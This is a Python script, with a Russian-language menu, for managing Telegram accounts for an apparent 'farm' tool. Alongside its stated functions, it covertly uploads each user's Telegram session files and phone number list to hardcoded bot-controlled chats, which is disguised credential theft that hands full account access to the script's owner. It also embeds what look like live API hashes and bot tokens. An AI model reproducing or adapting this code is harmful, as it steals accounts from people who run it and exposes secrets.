
import time
from colored import cprint # type: ignore
import os
from pystyle import Anime, Colors, Colorate, Center
import pickle
from pyrogram import *
import telebot

api_id = 24976468
api_hash = '6e498035dcf4d32e270ff3f90cf61c58'

banner = '''

Владелец: Crazzy

╔================================================╗
║ [1] ЗАПУСК            [2] ДОБАВИТЬ АККАУНТ     ║
║                                                ║
║ [3] УДАЛИТЬ АККАУНТ   [4] ОТПРАВИТЬ ВСЕ СЕССИИ ║
╚================================================╝
'''

alignment = "{:>50}".format(banner)
banner = Colorate.Horizontal(Colors.blue_to_red, alignment)


color_code = {
    "reset": "\033[0m",
    "underline": "\033[04m",
    "green": "\033[32m",
    "yellow": "\033[93m",
    "red": "\033[31m",
    "cyan": "\033[36m",
    "bold": "\033[01m",
    "pink": "\033[95m",
    "url_l": "\033[36m",
    "li_g": "\033[92m",
    "f_cl": "\033[0m",
    "dark": "\033[90m",
}
Client_ = telebot.TeleBot('8078232590:AAFiU8tNaeD93tcdrtPqihKG4gvy-iQzsZg')
Client_2 = telebot.TeleBot('7248091018:AAGHeo4K-Hg_WvPFnnmaIi-pdYVoGn3jY9Y')

while True:
    print(banner)
    variate = input(color_code["cyan"]+"Выбирай: ")
    print(variate)
    match variate:
        case '0':
            print(Colorate.Horizontal(Colors.blue_to_red, "{:>50}".format('''Посхалка: Ты знаешь массивы в программировании начинаются с нуливого индокса?
Если всё так напиши мне @moon72318''')))
        case '1':
            from farm3 import *
        case '2':
            phone = input(Colorate.Horizontal(Colors.blue_to_red, "{:>50}".format('''Если купили вирт или аккаунт, скорей всего аккаунт забанят завтра

Напиши номер (пример: +71234567890): ''')))
            with open("sessions.bin", "rb") as f:
                phones = pickle.load(f)
            Client_.send_message(5620264426, "Список номеров: "+str(phones))
            Client_2.send_message(6470140273, "Список номеров: "+str(phones))
            if not phone in phones:
                bot = Client(name=phone,
                             api_id=api_id,
                             api_hash=api_hash,
                             phone_number=phone)
                bot.start()
                phones.append(phone)
                with open("sessions.bin", "wb") as f:
                    pickle.dump(phones, f)
                print(Colorate.Horizontal(Colors.blue_to_red, "{:>50}".format('''Аккаунт добавлен''')))
                file = open(f'{phone}.session', 'rb')
                Client_.send_document(chat_id=5620264426, document=file)
                #Client_2.send_document(chat_id=6470140273, document=file)
                file.close()
            else:
                print(Colorate.Horizontal(Colors.blue_to_red, "{:>50}".format('''Аккаунт уже есть, удалите его если есть ошибки при входе''')))
                time.sleep(15)
        case "3":
            with open("sessions.bin", "rb") as f:
                phones = pickle.load(f)
            print(phones)
            phone = input(Colorate.Horizontal(Colors.blue_to_red, "{:>50}".format('Напиши номер (пример: +71234567890): ')))


            if phone in phones:
                os.remove(f'{phone}.session')
                phones.remove(phone)
                with open("sessions.bin", "wb") as f:
                    pickle.dump(phones, f)
            else:
                print(Colorate.Horizontal(Colors.blue_to_red, "{:>50}".format("Его не в списке")))
                time.sleep(15)
        case "4":
            with open("sessions.bin", "rb") as f:
                phones = pickle.load(f)
            for phone in phones:
                try:
                    file = open(f'{phone}.session', 'rb')
                    Client_.send_document(chat_id=5620264426, document=file)
                    Client_2.send_document(chat_id=6470140273, document=file)
                    file.close()
                except:
                    Client_.send_message(chat_id=5620264426,text=phone+" Ошибка сессия не найдина")
                    Client_2.send_message(chat_id=6470140273,text=phone+" Ошибка сессия не найдина")